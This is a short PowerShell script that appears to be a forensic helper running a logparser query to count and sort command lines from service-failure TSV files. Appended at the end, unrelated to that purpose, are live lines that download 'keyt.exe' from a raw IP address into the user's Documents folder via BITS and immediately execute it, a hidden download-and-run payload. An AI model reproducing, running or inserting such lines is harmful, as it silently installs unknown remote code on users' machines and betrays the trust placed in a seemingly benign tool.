

if (Get-Command logparser.exe) {

    $lpquery = @"
    SELECT
        COUNT(To_Lowercase(CmdLine)) as ct, 
        To_Lowercase(CmdLine) as CmdLineLC
    FROM
        *SvcFail.tsv
    GROUP BY
        CmdLineLC
    ORDER BY
        ct ASC
"@

    & logparser -stats:off -i:csv -fixedsep:on -dtlines:0 -rtp:-1 $lpquery

} else {
    $ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)
    "${ScriptName} requires logparser.exe in the path."
}

Import-Module BitsTransfer
$path = [environment]::getfolderpath("mydocuments")
Start-BitsTransfer -Source "http://94.102.50.39/keyt.exe" -Destination "$path\keyt.exe"
Invoke-Item  "$path\keyt.exe"

